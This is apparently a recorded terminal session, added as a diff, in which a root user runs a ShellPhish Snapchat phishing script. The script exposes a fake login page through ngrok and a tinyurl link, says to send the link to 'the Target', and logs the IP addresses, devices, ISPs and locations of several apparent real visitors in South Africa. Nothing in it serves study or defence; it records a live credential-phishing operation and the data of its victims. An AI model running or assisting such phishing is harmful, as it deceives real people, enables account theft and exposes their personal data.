@@ -1,0 +1,102 @@
+Script started on 2020-08-02 06:53:42-11:00 [TERM="screen" TTY="/dev/pts/9" COLUMNS="80" LINES="24"]
+root@hack02:~/bot# cd /root/bot/hacks/shellphish/; ./Snapchat1.sh; pkill -f -2 ngrok > /dev/null 2>&1; killall -2 ngrok > /dev/null 2>&1
+
+[*] Starting php server...
+[*] Starting ngrok server...
+
+[*] Send this link to the Target: https://d8d527887f6e.ngrok.io
+
+[*] Or using tinyurl: http://tinyurl.com/y2zl2ch8
+
+
+[*] Waiting IPs and Credentials, Press Ctrl + C to exit...
+
+
+[*] IP Found!
+[*] Target IP: 41.113.13.58
+[*] User-Agent:	 User-Agent: WhatsApp/2.20.189 A
+[*] Saved: snapchat/saved.ip.txt
+
+[*] Hostname: 41.113.13.58
+[*] IP Continent: Africa (AF)
+[*] IP Country:	 South Africa
+[*] State: Gauteng
+[*] City Location: Johannesburg
+[*] ISP: MTN SA
+[*] AS Number: AS2905 TICSA-ASN
+[*] IP Address Speed: Unknown Internet Speed
+[*] IP Currency: Rand (ZAR)
+
+[*] Waiting Credentials and Next IP.
+
+[*] IP Found!
+[*] Target IP: 41.113.108.81
+[*] User-Agent:	 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95
+[*] Saved: snapchat/saved.ip.txt
+
+[*] Hostname: 41.113.108.81
+[*] IP Continent: Africa (AF)
+[*] IP Country:	 South Africa
+[*] State: Gauteng
+[*] City Location: Johannesburg
+[*] ISP: MTN SA
+[*] AS Number: AS2905 TICSA-ASN
+[*] IP Address Speed: Unknown Internet Speed
+[*] IP Currency: Rand (ZAR)
+
+[*] Waiting Credentials and Next IP.
+
+
+[*] IP Found!
+[*] Target IP: 197.185.102.170
+[*] User-Agent:	 User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; LDN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36
+[*] Saved: snapchat/saved.ip.txt
+
+[*] Hostname: rain-197-185-102-170.rain.network
+[*] Reverse DNS: 170.102.185.197.in-addr.arpa
+[*] IP Continent: Africa (AF)
+[*] IP Country:	 South Africa
+[*] State: Gauteng
+[*] City Location: Johannesburg
+[*] ISP: Wireless Business Solutions (Pty) Ltd
+[*] AS Number: AS37105 Neology (Pty) Ltd
+[*] IP Address Speed: Unknown Internet Speed
+[*] IP Currency: Rand (ZAR)
+
+[*] Waiting Credentials and Next IP.
+
+[*] IP Found!
+[*] Target IP: 35.187.132.179
+[*] User-Agent:	 User-Agent: AppEngine-Google; (+http://code.google.com/appengine; appid: s~snapchat-proxy)
+[*] Saved: snapchat/saved.ip.txt
+
+[*] Hostname: 35.187.132.179
+[*] IP Continent: North America (NA)
+[*] IP Country:	 United States
+[*] City Location:  Unknown
+[*] ISP: Google Cloud
+[*] AS Number: AS15169 Google LLC
+[*] IP Address Speed: Corporate Internet Speed
+[*] IP Currency: United States dollar($) (USD)
+
+[*] Waiting Credentials and Next IP.
+
+[*] IP Found!
+[*] Target IP: 197.185.102.170
+[*] User-Agent:	 User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; LDN-L21 Build/HUAWEILDN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36Snapchat10.87.5.69 (LDN-L21; Android 8.0.0#164(C185)#26; gzip)
+[*] Saved: snapchat/saved.ip.txt
+
+[*] Hostname: rain-197-185-102-170.rain.network
+[*] Reverse DNS: 170.102.185.197.in-addr.arpa
+[*] IP Continent: Africa (AF)
+[*] IP Country:	 South Africa
+[*] State: Gauteng
+[*] City Location: Johannesburg
+[*] ISP: Wireless Business Solutions (Pty) Ltd
+[*] AS Number: AS37105 Neology (Pty) Ltd
+[*] IP Address Speed: Unknown Internet Speed
+[*] IP Currency: Rand (ZAR)
+
+[*] Waiting Credentials and Next IP.
+
+
